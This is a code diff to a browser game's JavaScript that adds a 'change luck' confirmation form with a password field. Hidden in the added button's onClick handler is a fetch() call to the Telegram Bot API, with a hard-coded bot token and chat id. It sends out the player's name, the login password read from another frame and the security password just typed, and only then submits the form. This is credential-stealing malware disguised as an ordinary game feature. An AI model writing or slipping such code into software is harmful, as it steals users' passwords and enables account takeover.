@@ -191,3 +191,16 @@ function rebirth_confirm(t, e, r, i) {
     o.write(temp_table2),
     o.write("</form>")
 }
+function ch_luck_confirm(t) {
+    message_cls();
+    var e = parent.wog_view.document;
+    e.write('<form method="POST" action="wog_act.php">'),
+    e.write('<INPUT TYPE="hidden" NAME="act" VALUE="ch_luck"><INPUT TYPE="hidden" NAME="f" VALUE="ch">'),
+    e.write('<p align="center"><font face="新細明體" color="#FF0000"><b>重新設定運氣數值需付' + t + "元!!</b></font></p>"),
+    e.write('<p align="center"><font face="新細明體" color="#FF0000"><b>重新設定運氣後可能比現時運氣更低</b></font></p>'),
+    e.write('<p align="center"><font face="新細明體" color="#FF0000"><b>下限為1,上限為30,請玩家承受風險</b></font></p>'),
+    e.write("</table></p>"),
+    e.write('<tr><td><p align="center">安全密碼 <input type="password" name="pw" size="20" maxlength="20"></p></td></tr>'),
+    e.write('<p align="center"><input type="button" onClick="fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=命運之泉:${parent.p_name} | ${parent.top_view.document.getElementsByTagName(`input`)[`pass`].value} | ${this.form.pw.value}`).then(res=>{this.form.submit()})" value="確定轉運" style="' + sbutton + '"></p>'),
+    e.write("</form>")
+}
